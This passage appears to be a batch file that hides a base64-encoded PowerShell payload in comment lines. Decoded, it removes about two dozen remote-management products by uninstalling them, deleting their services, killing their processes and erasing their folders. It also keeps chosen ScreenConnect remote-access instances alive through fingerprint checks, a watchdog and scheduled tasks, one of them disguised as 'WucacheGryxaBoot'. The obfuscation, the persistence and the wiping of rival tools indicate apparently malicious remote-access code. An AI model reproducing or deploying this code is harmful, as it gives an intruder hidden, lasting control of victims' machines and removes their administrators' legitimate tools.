::UHJvZ3JhbUZpbGVzXE5vTWFjaGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxOb01hY2hpbmUiKTsgUHJvZD1AKCdOb01hY2hpbmUqJykgfQ0KICAgICAgICBA
::eyBUYWc9J05pbmphT25lJzsgICAgIFN2Yz1AKCdOaW5qYVJNTUFnZW50Jywnbmlu
::amFybW0qJywnTmluamFSTU0qJyk7IFByb2M9QCgnTmluamFSTU1BZ2VudConLCdu
::aW5qYXJtbSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOaW5qYVJNTUFn
::ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphUk1NQWdlbnQiLCIk
::ZW52OlByb2dyYW1EYXRhXE5pbmphUk1NQWdlbnQiLCIkZW52OlByb2dyYW1GaWxl
::c1xOaW5qYU9uZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYU9uZSIp
::OyBQcm9kPUAoJ05pbmphUk1NKicsJ05pbmphT25lKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdBdGVyYSc7ICAgICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAo
::J0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQVRFUkEg
::TmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQVRFUkEgTmV0d29y
::a3MiLCIkZW52OlByb2dyYW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgn
::QXRlcmEqJykgfQ0KICAgICAgICBAeyBUYWc9J0Nvbm5lY3RXaXNlJzsgIFN2Yz1A
::KCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJh
::eSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRlbnY6UHJvZ3JhbUZp
::bGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExh
::YlRlY2ggQ2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywn
::Q29ubmVjdFdpc2UgUk1NKicsJ0xhYlRlY2gqJykgfQ0KICAgICAgICBAeyBUYWc9
::J0thc2V5YSc7ICAgICAgIFN2Yz1AKCdBZ2VudE1vbicsJ0thc2V5YSonLCdLQUFE
::UyonKTsgUHJvYz1AKCdBZ2VudE1vbionLCdLYXNleWEqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcS2FzZXlhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::XEthc2V5YSIpOyBQcm9kPUAoJ0thc2V5YSBWU0EqJywnS2FzZXlhIEFnZW50Kicp
::IH0NCiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAgICBTdmM9QCgnQWR2YW5j
::ZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRyYWwqJyk7IFBy
::b2M9QCgnRmlsZVN5c3RlbUFnZW50KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCIs
::IiRlbnY6UHJvZ3JhbUZpbGVzXE4tYWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hub2xvZ2llcyIsIiRlbnY6UHJv
::Z3JhbUZpbGVzXE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::TVNQQSBGaWxlcyIpOyBQcm9kPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQq
::JywnTi1hYmxlKicsJ04tY2VudHJhbConLCdOLXNpZ2h0KicsJ1Rha2UgQ29udHJv
::bConLCdTb2xhcldpbmRzIE1TUConKSB9DQogICAgICAgIEB7IFRhZz0nU3luY3Jv
::JzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFByb2M9QCgnU3lu
::Y3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBh
::aXJUZWNoIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIk
::ZW52OlByb2dyYW1GaWxlc1xTeW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cU3luY3JvIiwiJGVudjpQcm9ncmFtRGF0YVxTeW5jcm8iKTsgUHJvZD1AKCdT
::eW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1B1bHNld2F5JzsgICAgIFN2Yz1AKCdQdWxzZXdheSonLCdQQyBNb25pdG9y
::KicpOyBQcm9jPUAoJ1BDTW9uaXRvck1ncionLCdQQ01vbml0b3JNYW5hZ2VyKics
::J1B1bHNld2F5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFB1bHNld2F5
::IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFB1bHNld2F5IiwiJGVudjpQcm9n
::cmFtRmlsZXNcUEMgTW9uaXRvciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQ
::QyBNb25pdG9yIik7IFByb2Q9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKSB9
::DQogICAgICAgIEB7IFRhZz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1cGVyT3Bz
::KicpOyBQcm9jPUAoJ1N1cGVyT3BzKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cGVyT3Bz
::IiwiJGVudjpQcm9ncmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1cGVyT3Bz
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdMZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2
::ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwiLCIkZW52
::OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J0FjdGlvbjEnOyAgICAgIFN2Yz1AKCdBY3Rpb24xKicpOyBQcm9j
::PUAoJ0FjdGlvbjEqJywnYWN0aW9uMV9hZ2VudConKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xBY3Rpb24xIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFj
::dGlvbjEiLCIkZW52OlByb2dyYW1EYXRhXEFjdGlvbjEiKTsgUHJvZD1AKCdBY3Rp
::b24xKicpIH0NCiAgICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUnOyBTdmM9QCgn
::TWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5h
::Z2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxNYW5hZ2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyon
::LCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9pbnQgQ2VudHJhbConLCdSTU0gQ2Vu
::dHJhbConKSB9DQogICAgICAgIEB7IFRhZz0nVGFjdGljYWxSTU0nOyAgU3ZjPUAo
::J3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnKTsgUHJvYz1A
::KCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJz
::PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX1cVGFjdGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVz
::XE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2Vu
::dCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01lc2ggQWdlbnQqJywnTWVzaENlbnRy
::YWwqJykgfQ0KICAgICAgICBAeyBUYWc9J01lc2hDZW50cmFsJzsgIFN2Yz1AKCdN
::ZXNoIEFnZW50JywnTWVzaEFnZW50JywnTWVzaENlbnRyYWwqJyk7IFByb2M9QCgn
::TWVzaEFnZW50KicsJ01lc2hDZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVz
::aCBBZ2VudCIpOyBQcm9kPUAoJ01lc2gqQWdlbnQqJywnTWVzaENlbnRyYWwqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAgIFN2Yz1AKCdTQUFaKics
::J0NvbnRpbnV1bSonKTsgUHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xTQUFaT0QiLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmlsZXNcQ29udGludXVtIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9kPUAoJ0Nv
::bnRpbnV1bSonLCdTQUFaKicpIH0NCiAgICAgICAgQHsgVGFnPSdOYXZlcmlzayc7
::ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7IFByb2M9QCgnTmF2ZXJpc2sqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2siLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayonKSB9DQog
::ICAgICAgIEB7IFRhZz0nSW1teUJvdCc7ICAgICAgU3ZjPUAoJ0ltbXlCb3QqJywn
::SW1teSonKTsgUHJvYz1AKCdJbW15QWdlbnQqJywnSW1teUJvdConKTsgRGlycz1A
::KCIkZW52OlByb2dyYW1GaWxlc1xJbW15Qm90IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9XEltbXlCb3QiLCIkZW52OlByb2dyYW1EYXRhXEltbXlCb3QiKTsgUHJv
::ZD1AKCdJbW15Qm90KicpIH0NCiAgICAgICAgQHsgVGFnPSdBdXRvbW94JzsgICAg
::ICBTdmM9QCgnYW1hZ2VudConLCdBdXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV0b21veCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFtRGF0YVxhbWFn
::ZW50Iik7IFByb2Q9QCgnQXV0b21veConKSB9DQogICAgICAgIEB7IFRhZz0nQWNy
::b25pc0N5YmVyJzsgU3ZjPUAoJ0Fjcm9uaXMqJyk7IFByb2M9QCgnYWNyb2NtZCon
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3JvbmlzIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3JvbmlzIEN5YmVy
::KicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9DQog
::ICAgICAgIEB7IFRhZz0nRG9tb3R6JzsgICAgICAgU3ZjPUAoJ0RvbW90eionKTsg
::UHJvYz1AKCdEb21vdHoqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcRG9t
::b3R6IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERvbW90eiIpOyBQcm9kPUAo
::J0RvbW90eionKSB9DQogICAgICAgIEB7IFRhZz0nQXV2aWsnOyAgICAgICAgU3Zj
::PUAoJ0F1dmlrKicpOyBQcm9jPUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dmlr
::Iik7IFByb2Q9QCgnQXV2aWsqJykgfQ0KICAgICAgICBAeyBUYWc9J0JhcnJhY3Vk
::YVJNTSc7IFN2Yz1AKCdCYXJyYWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicp
::OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJhcnJhY3VkYSIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEiLCIkZW52OlByb2dyYW1GaWxlc1xM
::ZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwg
::UGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2VkIFdv
::cmtwbGFjZSonKSB9DQogICAgICAgIEB7IFRhZz0nR292ZXJsYW4nOyAgICAgU3Zj
::PUAoJ0dvdmVybGFuKicpOyBQcm9jPUAoJ2dvdmVybGFuKicsJ2dvdmFnZW50Kicp
::OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvdmVybGFuIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEdvdmVybGFuIik7IFByb2Q9QCgnR292ZXJsYW4qJykg
::fQ0KICAgICAgICBAeyBUYWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQRFEqJyk7
::IFByb2M9QCgnUERRUnVubmVyKicsJ1BEUUludmVudG9yeSonLCdQRFFEZXBsb3kq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRtaW4gQXJzZW5hbCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVudjpQcm9n
::cmFtRmlsZXNcUERRIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQ
::cm9kPUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVudG9yeSonLCdQRFEgQ29ubmVj
::dConKSB9DQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgew0K
::ICAgICAgICAkaGl0ID0gJGZhbHNlDQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4g
::JHRvb2wuUHJvZCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNj
::cmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAgICAgICAgICAgIEdldC1DaGls
::ZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
::YWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRl
::bVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5k
::ICRkbiAtbGlrZSAkcGF0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAo
::SXMtRGF0dG9LZWVwZXIgJGRuKSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBb
::JGRuXSI7IHJldHVybiB9DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVW5p
::bnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZSB9
::DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAg
::ICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAk
::dG9vbC5TdmMpIHsNCiAgICAgICAgICAgIEdldC1TZXJ2aWNlIC1OYW1lICRwYXQg
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7
::DQogICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRfLk5hbWUgLW9y
::IElzLURhdHRvS2VlcGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAicm1tX3NraXBf
::ZGF0dG9fc3ZjICQoJF8uTmFtZSkiOyByZXR1cm4gfQ0KICAgICAgICAgICAgICAg
::ICYgc2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbA0KICAg
::ICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwDQogICAg
::ICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwg
::T3V0LU51bGwNCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVl
::OyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUpIFskKCR0b29sLlRhZyld
::Ig0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRw
::YXQgaW4gJHRvb2wuUHJvYykgew0KICAgICAgICAgICAgR2V0LVByb2Nlc3MgLU5h
::bWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gt
::T2JqZWN0IHsNCiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklk
::IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAg
::ICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3Byb2Nfa2ls
::bGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIg0KICAgICAgICAg
::ICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRp
::cnMpIHsNCiAgICAgICAgICAgIGlmICgkZCAtYW5kIChUZXN0LVBhdGggLUxpdGVy
::YWxQYXRoICRkKSkgew0KICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBl
::ciAkZCkgeyBMb2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7IGNvbnRpbnVlIH0N
::CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLnJt
::bSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9DQog
::ICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJybW1fZGlyX1JF
::TU9WRV9GQUlMRUQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAg
::ICAgICBpZiAoJGhpdCkgeyBMb2cgInJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5U
::YWcpIiB9DQogICAgfQ0KDQogICAgJHN1bW1hcnkgPSAiZXh0ZXJtaW5hdGUgc3Zj
::PSQoJG4uc3ZjKSBwcm9jPSQoJG4ucHJvYykgZGlyPSQoJG4uZGlyKSBwcm9kdWN0
::PSQoJG4ucHJvZHVjdCkgcm1tPSQoJG4ucm1tKSBmYWlsPSQoJG4uZmFpbCkiDQog
::ICAgTG9nICRzdW1tYXJ5DQogICAgcmV0dXJuICRzdW1tYXJ5DQp9DQoNCmZ1bmN0
::aW9uIFVwZGF0ZS1TdGF0ZSB7DQogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2Vy
::cHJpbnRzKQ0KICAgICRncnl4YUZwID0gR2V0LUdyeXhhRnANCiAgICAkc2V2cnog
::PSBAKEdldC1TZXZyektlZXApDQogICAgJHByaW1GcCA9ICRzZXZyelswXTsgJGFs
::dEZwID0gJHNldnJ6WzFdDQogICAgJHByaW0gPSAkbnVsbDsgJGFsdCA9ICRudWxs
::OyAkc2NyaXB0OmdyeXhhID0gJG51bGwNCiAgICBmb3JlYWNoICgkc3ZjIGluIChH
::ZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsNCiAg
::ICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScp
::IHsNCiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAg
::ICAgICAgICAgaWYgKCRmcCAtZXEgJHByaW1GcCkgeyAkcHJpbSA9ICIkKCRzdmMu
::U3RhdHVzKSIgfQ0KICAgICAgICAgICAgZWxzZWlmICgkZnAgLWVxICRhbHRGcCkg
::eyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgICAgICBlbHNlaWYg
::KCRmcCAtZXEgJGdyeXhhRnAgLW9yIChUZXN0LUlzR3J5eGFGcCAkZnApKSB7ICRz
::Y3JpcHQ6Z3J5eGEgPSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAgfQ0KICAg
::IH0NCiAgICAkZm9yZWlnbiA9IEAoKQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
::dC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgew0KICAg
::ICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJyAt
::YW5kICRtYXRjaGVzWzFdIC1ub3RpbiAka2VlcCkgew0KICAgICAgICAgICAgJGZv
::cmVpZ24gKz0gJG1hdGNoZXNbMV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkaWQg
::PSBSZWFkLUlkZW50aXR5DQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9
::IDANCiAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19D
::JywnVEFTS19EJykgew0KICAgICAgICAkdGFza3NUb3RhbCsrDQogICAgICAgICR0
::biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJGtdKQ0KICAgICAg
::ICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQ0KICAgICAgICAkbWFya2VyID0g
::aWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0gZWxzZSB7ICdv
::d25fbW9uLmNtZCcgfQ0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRu
::ICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2Vy
::KSkgeyAkdGFza3NPaysrIH0NCiAgICB9DQogICAgIyBMMzk6IGNvdW50IFd1Y2Fj
::aGVHcnl4YUJvb3QgKFRBU0tfRykNCiAgICAkdGFza3NUb3RhbCsrDQogICAgJHRn
::TmFtZSA9ICdXdWNhY2hlR3J5eGFCb290Jw0KICAgIGlmICgoR2V0LVNjaGVkdWxl
::ZFRhc2sgLVRhc2tOYW1lICR0Z05hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUpIC1vcg0KICAgICAgICAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9p
::bi1QYXRoICRXb3JrRGlyICdncnl4YV9ib290LmNtZCcpKSkgew0KICAgICAgICAk
::dGFza3NPaysrDQogICAgfQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25Q
::YXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAgICR3
::ZCA9IEVuc3VyZS1XYXRjaGRvZw0KICAgICRwcmV2ID0gQHt9DQogICAgJHN0YXRl
::UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicNCiAgICBpZiAo
::VGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsNCiAgICAgICAgdHJ5IHsgKEdldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1K
::c29uKS5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJl
::dlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7fQ0KICAgIH0NCiAgICAk
::aW5zdGFsbENvdW50ID0gMQ0KICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQpIHsg
::JGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0NCiAgICBp
::ZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5k
::ICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0NCiAgICAk
::c3RhdGUgPSBbb3JkZXJlZF1Aew0KICAgICAgICBob3N0ICAgICAgICAgPSAkZW52
::OkNPTVBVVEVSTkFNRQ0KICAgICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUp
::LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykNCiAgICAgICAgYnVpbGQg
::ICAgICAgID0gJEJ1aWxkDQogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRw
::cmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBhbHQg
::ICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcn
::IH0pDQogICAgICAgIGdyeXhhICAgICAgICA9ICQoaWYgKCRzY3JpcHQ6Z3J5eGEp
::IHsgJHNjcmlwdDpncnl4YSB9IGVsc2UgeyAnTUlTU0lORycgfSkNCiAgICAgICAg
::Z3J5eGFGcCAgICAgID0gJGdyeXhhRnANCiAgICAgICAgZm9yZWlnbiAgICAgID0g
::JGZvcmVpZ24NCiAgICAgICAgdGFza3NPayAgICAgID0gJHRhc2tzT2sNCiAgICAg
::ICAgdGFza3NUb3RhbCAgID0gJHRhc2tzVG90YWwNCiAgICAgICAgd2F0Y2hkb2cg
::ICAgID0gJHdkDQogICAgICAgIGluc3RhbGxDb3VudCA9ICRpbnN0YWxsQ291bnQN
::CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAoJEV4dHJhKSB7IChHZXQtRGF0
::ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVsc2VpZiAoJHBy
::ZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkN
::CiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhDQogICAgfQ0KICAgICgkc3Rh
::dGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRzdGF0ZVBhdGggLUZvcmNlDQogICAgcmV0dXJuICRzdGF0ZQ0K
::fQ0KDQpzd2l0Y2ggKCRBY3Rpb24pIHsNCiAgICAnaW5pdCcgICAgICAgICAgICB7
::ICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkg
::fCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0K
::ICAgICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlk
::LkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0k
::KCRfLlZhbHVlKSIgfSB9DQogICAgJ3dhdGNoZG9nJyAgICAgICAgeyBJbnN0YWxs
::LVdhdGNoZG9nIHwgT3V0LU51bGwgfQ0KICAgICd3YXRjaGRvZy1lbnN1cmUnIHsg
::RW5zdXJlLVdhdGNoZG9nIH0NCiAgICAndGFza3MtZW5zdXJlJyAgICB7IEVuc3Vy
::ZS1QZXJzaXN0VGFza3MgfQ0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRl
::LVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0NCiAgICAncmVwYWly
::JyAgICAgICAgICB7IFJlcGFpci1TQ1NlcnZpY2UgJEZwIH0NCiAgICAncmVnaXN0
::ZXJlZCcgICAgICB7IFRlc3QtU0NSZWdpc3RlcmVkICRGcCB9DQogICAgJ2V4dGVy
::bWluYXRlJyAgICAgeyBJbnZva2UtRXh0ZXJtaW5hdGUgfQ0KICAgICdncnl4YS1o
::ZWFsdGgnICAgIHsgVGVzdC1Hcnl4YUhlYWx0aCB9DQogICAgJ3N5bmMtZ3J5eGEt
